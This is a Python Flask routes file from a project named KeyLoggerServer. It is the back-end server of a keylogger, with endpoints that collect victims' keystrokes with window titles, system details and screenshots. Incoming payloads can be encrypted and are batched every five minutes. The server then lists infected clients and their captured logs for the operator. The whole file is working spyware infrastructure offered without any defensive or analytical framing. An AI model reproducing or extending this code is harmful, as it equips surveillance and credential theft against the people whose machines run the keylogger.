# KeyLoggerServer/src/api/routes.py

from flask import request, jsonify
from flask_jwt_extended import jwt_required, create_access_token
from src.database.crud import (
    get_or_create_client, add_key_log, add_system_info,
    add_screenshot, get_client_logs, get_all_clients
)
from src.utils.encryption import decrypt_data
from src.config.config_loader import load_config
from datetime import datetime
import json
import logging

# Setup logger
logger = logging.getLogger(__name__)

def format_response(success: bool, message: str, data=None):
    return jsonify({
        "success": success,
        "message": message,
        "data": data
    })

def register_routes(app):
    config = load_config()
    encryption_key = config['security']['encryption_key']
    
    @app.route('/api/auth', methods=['POST'])
    def auth():
        # Simple authentication endpoint
        # In production, you'd want proper authentication
        access_token = create_access_token(identity='client')
        return jsonify({'access_token': access_token})
    
    @app.route('/api/client/register', methods=['POST'])
    @jwt_required()
    def register_client():
        data = request.get_json()
        client = get_or_create_client(
            data.get('client_id'),
            data.get('computer_name'),
            data.get('user_name'),
            data.get('os_version')
        )
        return jsonify({'status': 'success', 'client_id': client.id})
    
    @app.route('/api/data/keylog', methods=['POST'])
    @jwt_required()
    def receive_keylog():
        data = request.get_json()
        
        # Decrypt data if encrypted
        if data.get('encrypted'):
            decrypted = decrypt_data(data['data'].encode(), encryption_key)
            log_data = json.loads(decrypted)
        else:
            log_data = data
        
        client = get_or_create_client(log_data['client_id'])
        
        for entry in log_data['entries']:
            add_key_log(
                client.id,
                datetime.fromisoformat(entry['timestamp']),
                entry['window_title'],
                entry['key_data']
            )
        
        return jsonify({'status': 'success', 'received': len(log_data['entries'])})
    
    @app.route('/api/data/system', methods=['POST'])
    @jwt_required()
    def receive_system_info():
        data = request.get_json()
        client = get_or_create_client(data['client_id'])
        
        # Decrypt data if encrypted
        if data.get('encrypted'):
            decrypted = decrypt_data(data['data'].encode(), encryption_key)
            system_data = json.loads(decrypted)
        else:
            system_data = data
        
        add_system_info(client.id, json.dumps(system_data))
        return jsonify({'status': 'success'})
    
    @app.route('/api/data/screenshot', methods=['POST'])
    @jwt_required()
    def receive_screenshot():
        data = request.get_json()
        client = get_or_create_client(data['client_id'])
        
        # Decrypt data if encrypted
        if data.get('encrypted'):
            image_data = decrypt_data(data['image_data'].encode(), encryption_key)
        else:
            image_data = data['image_data']
        
        add_screenshot(client.id, image_data.encode())
        return jsonify({'status': 'success'})
    
    @app.route('/api/clients', methods=['GET'])
    @jwt_required()
    def get_clients():
        clients = get_all_clients()
        return jsonify([{
            'id': client.id,
            'computer_name': client.computer_name,
            'user_name': client.user_name,
            'os_version': client.os_version,
            'last_seen': client.last_seen.isoformat(),
            'created_at': client.created_at.isoformat()
        } for client in clients])
    
    @app.route('/api/client/<client_id>/logs', methods=['GET'])
    @jwt_required()
    def get_logs(client_id):
        limit = request.args.get('limit', 100)
        logs = get_client_logs(client_id, limit)
        return jsonify([{
            'timestamp': log.timestamp.isoformat(),
            'window_title': log.window_title,
            'key_data': log.key_data
        } for log in logs])

    # Add batch processing endpoint
    @app.route('/api/data/batch', methods=['POST'])
    @jwt_required()
    def receive_batch_data():
        """
        Receive batched data from clients (every 5 minutes)
        """
        try:
            data = request.get_json()
            
            # Decrypt data if encrypted
            if data.get('encrypted'):
                decrypted = decrypt_data(data['data'].encode(), encryption_key)
                batch_data = json.loads(decrypted)
            else:
                batch_data = data
            
            # Validate batch structure
            if not all(k in batch_data for k in ['batch_id', 'client_id', 'entries']):
                return format_response(False, "Invalid batch data format"), 400
            
            client = get_or_create_client(batch_data['client_id'])
            processed_count = 0
            
            # Process each entry in the batch
            for entry in batch_data['entries']:
                try:
                    if entry['type'] == 'keylog':
                        add_key_log(
                            client.id,
                            datetime.fromisoformat(entry['timestamp']),
                            entry.get('window_title', 'Unknown'),
                            entry['key_data']
                        )
                    elif entry['type'] == 'system':
                        add_system_info(client.id, json.dumps(entry['data']))
                    elif entry['type'] == 'screenshot':
                        add_screenshot(client.id, entry['image_data'].encode())
                    
                    processed_count += 1
                    
                except Exception as e:
                    logger.error(f"Error processing batch entry: {str(e)}")
                    continue
            
            logger.info(f"Processed batch {batch_data['batch_id']} from client {client.id}: "
                       f"{processed_count}/{len(batch_data['entries'])} entries")
            
            return jsonify({
                'status': 'success',
                'processed': processed_count,
                'total': len(batch_data['entries'])
            }), 200
            
        except Exception as e:
            logger.exception("Error processing batch data")
            return format_response(False, f"Internal server error: {str(e)}"), 500
